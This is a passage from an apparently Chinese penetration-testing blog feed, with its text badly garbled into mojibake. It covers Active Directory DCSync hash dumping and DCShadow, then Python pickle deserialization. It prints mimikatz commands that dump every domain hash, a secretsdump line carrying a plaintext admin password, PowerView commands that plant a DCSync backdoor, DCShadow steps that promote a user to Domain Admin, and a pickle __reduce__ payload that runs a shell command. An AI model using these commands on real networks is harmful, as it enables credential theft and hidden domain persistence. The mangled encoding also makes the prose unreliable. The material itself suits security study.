title="åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…å“ˆå¸Œ"></a>åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…å“ˆå¸Œ</h2><p><strong>Mimikatzä¸‹çš„åˆ©ç”¨</strong></p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤å¯¼å‡ºåŸŸå†…ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¯¼å‡ºåŸŸå†…æŒ‡å®šç”¨æˆ·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å“ˆå¸Œå€¼</span><br>mimkatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hacky-my\administrator&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å“ˆå¸Œå€¼</span><br>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit<br>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710533.png" alt="image-20240419005028742"></p><p>ä¸€èˆ¬æ¥è¯´ï¼ŒåŸŸç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ä»¥åŠ Krbtgt ç”¨æˆ·çš„å“ˆå¸Œæ˜¯æœ‰ä»·å€¼çš„ã€‚é€šè¿‡åŸŸç®¡ç†å‘˜çš„å“ˆå¸Œè¿›è¡Œå“ˆå¸Œä¼ é€’å¯ä»¥ç›´æ¥è·å–æœåŠ¡å™¨æ§åˆ¶æƒï¼Œè€ŒKrbtgtç”¨æˆ·çš„å“ˆå¸Œå¯ä»¥ç”¨æ¥åˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼Œå®ç°ç¥¨æ®ä¼ é€’æ”»å‡»ã€‚</p><p><strong>Impacketä¸‹çš„åˆ©ç”¨</strong></p><p>Impacketé¡¹ç›®ä¸­çš„secretsdump.pyè„šæœ¬æ”¯æŒé€šè¿‡ DCSync æŠ€æœ¯å¯¼å‡ºåŸŸæ§åˆ¶å™¨ä¸­ç”¨æˆ·å“ˆå¸Œã€‚è¯¥å·¥å…·å¯ä»¥ä½¿ç”¨æä¾›çš„é«˜æƒé™ç”¨æˆ·çš„ç™»å½•å‡­æ®ï¼Œä»æœªåŠ å…¥åŸŸçš„ç³»ç»Ÿä¸Šè¿œç¨‹è¿æ¥è‡³åŸŸæ§åˆ¶å™¨ï¼Œå¹¶ä»æ³¨å†Œè¡¨ä¸­å¯¼å‡ºæœ¬åœ°è´¦æˆ·çš„å“ˆå¸Œå€¼ï¼ŒåŒæ—¶é€šè¿‡ Dcsync æˆ–å·å½±å¤åˆ¶çš„æ–¹æ³•NTDS.dit æ–‡ä»¶ä¸­å¯¼å‡ºæ‰€æœ‰åŸŸç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python secretsdump.py hack-my.com/administrator:Admin\@123@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">10.10.10.11ä¸ºåŸŸæ§çš„IP</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨dcsyncç»´æŒåŸŸå†…æƒé™"><a href="#åˆ©ç”¨DCSyncç»´æŒåŸŸå†…æƒé™" class="headerlink" title="åˆ©ç”¨DCSyncç»´æŒåŸŸå†…æƒé™"></a>åˆ©ç”¨DCSyncç»´æŒåŸŸå†…æƒé™</h2><p>åœ¨è·å–åŸŸç®¡ç†å‘˜æƒé™åï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ‰‹åŠ¨ä¸ºåŸŸå†…æ ‡å‡†ç”¨æˆ·èµ‹äºˆ DCSync æ“ä½œçš„æƒé™ï¼Œä»è€Œå®ç°éšè”½çš„åŸŸåé—¨ã€‚åªéœ€ä¸ºæ™®é€šåŸŸç”¨æˆ·æ·»åŠ è¡¨æ‰€ç¤ºçš„ä¸¤æ¡æ‰©å±•æƒé™å³å¯ã€‚</p><table><thead><tr><th>CN</th><th>displayName</th><th>rightsGuid</th></tr></thead><tbody><tr><td>DS-Replication-Get-Changes</td><td>Replicating Directory Changes</td><td>1131f6aa-9c07-11d1-f79f-00c04fc2ded2</td></tr><tr><td>DS-Replication-Get-Changes</td><td>Replicating Directory Changes All</td><td>1131f6ad-9c07-11d1-f79f-00c04fc2ded2</td></tr></tbody></table><p>å¯ä»¥é€šè¿‡PowerShellæ¸—é€æ¡†æ¶ä¸‹çš„PowerView.ps1è„šæœ¬å®ç°ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-comment"># ä¸ºåŸŸç”¨æˆ·Marcusæ·»åŠ DCSyncæƒé™</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> Marcus<br><span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p>å¦‚æœè¦æ¸…é™¤æƒé™åˆ™æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> Marcus<br><span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><h2 id="dcshadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h2><p>DCShadow é€šè¿‡åˆ›å»ºæ¶æ„çš„åŸŸæ§åˆ¶å™¨ï¼Œåˆ©ç”¨åŸŸæ§ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶ï¼Œå°†é¢„å…ˆè®¾å®šçš„å¯¹è±¡æˆ–å¯¹è±¡å±æ€§æ³¨å…¥æ­£åœ¨è¿è¡Œçš„åˆæ³•åŸŸæ§åˆ¶å™¨ï¼Œä»¥æ­¤æ¥åˆ›å»ºåŸŸåé—¨æˆ–è€…è·å–å„ç§ç±»å‹çš„éæ³•è®¿é—®æ¸ é“ã€‚</p><p>ç›¸å…³åŸç†å‚è€ƒæ–‡ç« ï¼š<a href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/">https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</a></p><p>ä¸‹é¢é€šè¿‡ DCShadowä¿®æ”¹æ™®é€šåŸŸç”¨æˆ·Marcusçš„primaryGroupIDå±æ€§æ¼”ç¤º DCShadowçš„æ”»å‡»è¿‡ç¨‹ã€‚è¯¥å±æ€§æŒ‡å‘ç”¨æˆ·æ‰€å±çš„ä¸»è¦ç»„çš„RIDï¼Œé€šè¿‡å°†ç”¨æˆ·çš„ primaryGroupID æ”¹ä¸º 512ï¼Œå¯ä»¥è®©ç”¨æˆ·æˆä¸ºåŸŸç®¡ç†å‘˜ã€‚RID æŒ‡ç›¸å¯¹æ ‡è¯†ç¬¦ï¼Œæ˜¯ SID çš„ç»„æˆéƒ¨åˆ†ï¼Œä½äº SID å­—ç¬¦ä¸²çš„æœ«ç«¯ã€‚Windowsç³»ç»Ÿä½¿ç”¨RIDæ¥åŒºåˆ†ç”¨æˆ·è´¦æˆ·å’Œç»„ï¼Œå¸¸è§ç³»ç»Ÿè´¦æˆ·çš„ RID å¦‚è¡¨ï¼š</p><table><thead><tr><th>ç»„</th><th>RID</th></tr></thead><tbody><tr><td>Administrator</td><td>500</td></tr><tr><td>Guest</td><td>501</td></tr><tr><td>Kribtgt</td><td>502</td></tr><tr><td>Domain Admins</td><td>512</td></tr><tr><td>Domain Users</td><td>513</td></tr><tr><td>Domain Guests</td><td>514</td></tr><tr><td>Domain Computers</td><td>515</td></tr><tr><td>Domain Controllers</td><td>516</td></tr><tr><td>Schema Admins</td><td>518</td></tr><tr><td>Enterprise Admins</td><td>519</td></tr></tbody></table><p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>ä¸Šä¼ Mimikatzåˆ°ä¸»æœºï¼Œåœ¨æ‹¥æœ‰SYSTEMæƒé™ä¸‹æ‰§è¡Œä¸‹é¢å‘½ä»¤æ¥åˆ›å»ºæ¶æ„åŸŸæ§</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::dcshadow /object:CN=Marcus,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit<br></code></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œåç¬¬ä¸€ä¸ªå‘½ä»¤è¡Œçª—å£ä¸å…³é—­ï¼Œæ–°å¼€ä¸€ä¸ªåŸŸç®¡ç†å‘˜æƒé™çš„å‘½ä»¤è¡Œçª—å£ï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤å¼ºåˆ¶è§¦å‘åŸŸå¤åˆ¶ï¼Œå°†æ•°æ®æ›´æ”¹æ¨é€è‡³åˆæ³•åŸŸæ§</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit<br></code></pre></td></tr></table></figure></li></ol><p>æ­¤æ—¶ï¼ŒMarcusç”¨æˆ·çš„primaryGroupIDå±æ€§å·²æˆåŠŸè¢«ä¿®æ”¹ä¸º512ï¼Œå¹¶ä¸”Marcus å·²ç»æ˜¯åŸŸç®¡ç†å‘˜ç»„ä¸­çš„ç”¨æˆ·äº†ã€‚</p><p>å¯ä»¥ç”¨è¯¥å‘½ä»¤æ¥æŸ¥çœ‹åŸŸç®¡ç†å‘˜ç»„ç”¨æˆ·æ¥éªŒè¯ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group  &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p>DCShadow ä½¿å¾—æµ‹è¯•äººå‘˜å¯ä»¥ç›´æ¥ä¿®æ”¹æ´»åŠ¨ç›®å½•æ•°æ®åº“ä¸­çš„å¯¹è±¡ã€‚åœ¨åŸŸé˜²æŠ¤æ¯”è¾ƒä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ DCShadowæ“çºµ SID Historyã€Krbtgt è´¦æˆ·çš„å¯†ç ï¼Œæˆ–å°†ç”¨æˆ·æ·»åŠ åˆ°ç‰¹æƒç»„ï¼Œä»¥å®ç°åŸŸæƒé™æŒä¹…åŒ–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickleååºåˆ—åŒ–</title>
      <link href="/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹opcodeæ–¹ä¾¿æŸ¥</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjiDkDB0DRll7jiYD&alichlgref=https://cn.bing.com/">pickleååºåˆ—åŒ–åˆæ¢ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™ç¯‡æ–‡ç« å·²ç»è¯´çš„å¾ˆè¯¦ç»†äº†å€¼å¾—ç»†å“</p><h1 id="pickleä»‹ç»"><a href="#pickleä»‹ç»" class="headerlink" title="pickleä»‹ç»"></a>pickleä»‹ç»</h1><p>pickleå°±æ˜¯pythonä¸‹ä¸€ä¸ªç”¨äºè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŒ…ï¼Œä¼ è¾“å’Œå­˜å‚¨æ•°æ®æ›´åŠ çµæ´»ï¼Œæ˜¯ç»™pythonä¸“ç”¨çš„ã€‚</p><ul><li>ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹ã€‚</li><li>pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§<strong>ç‹¬ç«‹çš„è¯­è¨€</strong>ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚</li></ul><h1 id="å¯åºåˆ—åŒ–å¯¹è±¡"><a href="#å¯åºåˆ—åŒ–å¯¹è±¡" class="headerlink" title="å¯åºåˆ—åŒ–å¯¹è±¡"></a>å¯åºåˆ—åŒ–å¯¹è±¡</h1><ul><li><code>None</code> ã€ <code>True</code> å’Œ <code>False</code></li><li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°</li><li>strã€byteã€bytearray</li><li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»</li><li><code>__dict__</code> å±æ€§å€¼æˆ– <code>__getstate__()</code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰</li></ul><h2 id="object__reduce__-å‡½æ•°"><a href="#object-reduce-å‡½æ•°" class="headerlink" title="object.__reduce__() å‡½æ•°"></a><code>object.__reduce__()</code> å‡½æ•°</h2><ul><li>åœ¨å¼€å‘æ—¶ï¼Œå¯ä»¥é€šè¿‡é‡å†™ç±»çš„ <code>object.__reduce__()</code> å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚å…·ä½“è€Œè¨€ï¼Œpythonè¦æ±‚ <code>object.__reduce__()</code> è¿”å›ä¸€ä¸ª <code>(callable, ([para1,para2...])[,...])</code> çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚</li><li>åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼Œ <code>R</code> çš„ä½œç”¨ä¸ <code>object.__reduce__()</code> å…³ç³»å¯†åˆ‡ï¼šé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶å® <code>R</code> æ­£å¥½å¯¹åº” <code>object.__reduce__()</code> å‡½æ•°ï¼Œ <code>object.__reduce__()</code> çš„è¿”å›å€¼ä¼šä½œä¸º <code>R</code> çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«äº† <code>R</code> çš„ã€‚</li></ul><p>è¿™é‡Œæ˜¯ä¸€ä¸ªç®€å•çš„__reduce__()å‡½æ•°å®ä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(pickle.dumps(a))<br>pickle.loads(pickle.dumps(a))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="http://cdn.clown2024.cn/202407151442778.png" alt="image-20240426222330298"></p><h1 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h1><p>opcodeå°±æ˜¯pickleçš„é‡ç‚¹äº†ï¼Œopcodeèƒ½å¾ˆå¤§çš„å¢åŠ æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„çµæ´»æ€§</p><ul><li>pickleè§£æä¾é Pickle Virtual Machine (PVM)è¿›è¡Œã€‚</li><li>PVMæ¶‰åŠåˆ°ä¸‰ä¸ªéƒ¨åˆ†ï¼š1. è§£æå¼•æ“ 2. æ ˆ 3. å†…å­˜ï¼š</li><li>è§£æå¼•æ“ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° <code>.</code> åœæ­¢ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</li><li>æ ˆï¼šç”±Pythonçš„listå®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li><li>memoï¼šç”±Pythonçš„dictå®ç°ï¼Œä¸ºPVMçš„ç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚è¯´äººè¯ï¼šå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥ <code>key-value</code> çš„å½¢å¼å‚¨å­˜åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ã€‚</li></ul><h2 id="opcodeç‰ˆæœ¬"><a href="#opcodeç‰ˆæœ¬" class="headerlink" title="opcodeç‰ˆæœ¬"></a>opcodeç‰ˆæœ¬</h2><p>pickleç”±äºæœ‰ä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼Œåœ¨py3å’Œpy2ä¸­å¾—åˆ°çš„opcodeä¸ç›¸åŒã€‚ä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ï¼ˆæ‰€ä»¥ç”¨v0å°±å¯ä»¥åœ¨æ‰€æœ‰ç‰ˆæœ¬ä¸­æ‰§è¡Œï¼‰ã€‚ç›®å‰ï¼Œpickleæœ‰6ç§ç‰ˆæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;2&#x27;</span>:<span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pickleç‰ˆæœ¬<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>,pickle.dumps(a,protocol=i))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è¾“å‡ºï¼š<br>pickleç‰ˆæœ¬0 b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;<br>pickleç‰ˆæœ¬1 b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;<br>pickleç‰ˆæœ¬2 b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;<br>pickleç‰ˆæœ¬3 b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;<br>pickleç‰ˆæœ¬4 b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#x27;<br></code></pre></td></tr></table></figure><p>pickle3ç‰ˆæœ¬çš„opcodeç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># &#x27;abcd&#x27;<br>b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;<br><br># \x80ï¼šåè®®å¤´å£°æ˜ \x03ï¼šåè®®ç‰ˆæœ¬<br># \x04\x00\x00\x00ï¼šæ•°æ®é•¿åº¦ï¼š4<br># abcdï¼šæ•°æ®<br># qï¼šå‚¨å­˜æ ˆé¡¶çš„å­—ç¬¦ä¸²é•¿åº¦ï¼šä¸€ä¸ªå­—èŠ‚ï¼ˆå³\x00ï¼‰<br># \x00ï¼šæ ˆé¡¶ä½ç½®<br># .ï¼šæ•°æ®æˆªæ­¢<br></code></pre></td></tr></table></figure><h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>ä½¿ç”¨pickletoolså¯ä»¥æ–¹ä¾¿çš„å°†opcodeè½¬åŒ–ä¸ºä¾¿äºè‚‰çœ¼è¯»å–çš„å½¢å¼</p><p>åŒæ ·ç”¨ä¸Šé¢çš„ä¸ªç‰ˆæœ¬opcodeç‰ˆæœ¬ç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;2&#x27;</span>:<span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pickleç‰ˆæœ¬<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>,pickletools.dis(pickle.dumps(a,protocol=i)))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ç»“æœï¼š<br>    0: (    MARK<br>    1: d        DICT       (MARK at 0)<br>    2: p    PUT        0<br>    5: V    UNICODE    &#x27;1&#x27;<br>    8: p    PUT        1<br>   11: I    INT        1<br>   14: s    SETITEM<br>   15: V    UNICODE    &#x27;2&#x27;<br>   18: p    PUT        2<br>   21: I    INT        2<br>   24: s    SETITEM<br>   25: .    STOP<br>highest protocol among opcodes = 0<br>pickleç‰ˆæœ¬0 None<br>    0: &#125;    EMPTY_DICT<br>    1: q    BINPUT     0<br>    3: (    MARK<br>    4: X        BINUNICODE &#x27;1&#x27;<br>   10: q        BINPUT     1<br>   12: K        BININT1    1<br>   14: X        BINUNICODE &#x27;2&#x27;<br>   20: q        BINPUT     2<br>   22: K        BININT1    2<br>   24: u        SETITEMS   (MARK at 3)<br>   25: .    STOP<br>highest protocol among opcodes = 1<br>pickleç‰ˆæœ¬1 None<br>    0: \x80 PROTO      2<br>    2: &#125;    EMPTY_DICT<br>    3: q    BINPUT     0<br>    5: (    MARK<br>    6: X        BINUNICODE &#x27;1&#x27;<br>   12: q        BINPUT     1<br>   14: K        BININT1    1<br>   16: X        BINUNICODE &#x27;2&#x27;<br>   22: q        BINPUT     2<br>   24: K        BININT1    2<br>   26: u        SETITEMS   (MARK at 5)<br>   27: .    STOP<br>highest protocol among opcodes = 2<br>pickleç‰ˆæœ¬2 None<br>    0: \x80 PROTO      3<br>    2: &#125;    EMPTY_DICT<br>    3: q    BINPUT     0<br>    5: (    MARK<br>    6: X        BINUNICODE &#x27;1&#x27;<br>   12: q        BINPUT     1<br>   14: K        BININT1    1<br>   16: X        BINUNICODE &#x27;2&#x27;<br>   22: q        BINPUT     2<br>   24: K        BININT1    2<br>   26: u        SETITEMS   (MARK at 5)<br>   27: .    STOP<br>highest protocol among opcodes = 2<br>pickleç‰ˆæœ¬3 None<br>    0: \x80 PROTO      4<br>    2: \x95 FRAME      17<br>   11: &#125;    EMPTY_DICT<br>   12: \x94 MEMOIZE    (as 0)<br>   13: (    MARK<br>   14: \x8c     SHORT_BINUNICODE &#x27;1&#x27;<br>   17: \x94     MEMOIZE    (as 1)<br>   18: K        BININT1    1<br>   20: \x8c     SHORT_BINUNICODE &#x27;2&#x27;<br>   23: \x94     MEMOIZE    (as 2)<br>   24: K        BININT1    2<br>   26: u        SETITEMS   (MARK at 13)<br>   27: .    STOP<br>highest protocol among opcodes = 4<br>pickleç‰ˆæœ¬4 None<br></code></pre></td></tr></table></figure><p>é‚£äº›ç¬¦å·å°±æ˜¯opcode</p><h2 id="æ‰‹å†™opcode"><a href="#æ‰‹å†™opcode" class="headerlink" title="æ‰‹å†™opcode"></a>æ‰‹å†™opcode</h2><p>ä¸Šé¢çš„æ–‡ç« æœ‰åŠ¨å›¾å¯ä»¥æ›´å¥½åœ°ç†è§£opcodeï¼Œè¿™é‡Œä¸»è¦è®°å½•ä¸€äº›opcodeï¼Œä¸‹è¡¨æ˜¯ä½¬çš„opcodeè¡¨æ ¼ï¼Œè®°å½•äº†å„ç§opcodeçš„ç”¨æ³•</p><table><thead><tr><th>opcode</th><th>æè¿°</th><th>å…·ä½“å†™æ³•</th><th>æ ˆä¸Šçš„å˜åŒ–</th><th>memoä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td>c</td><td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰</td><td>c[module]\n[instance]\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>i</td><td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ 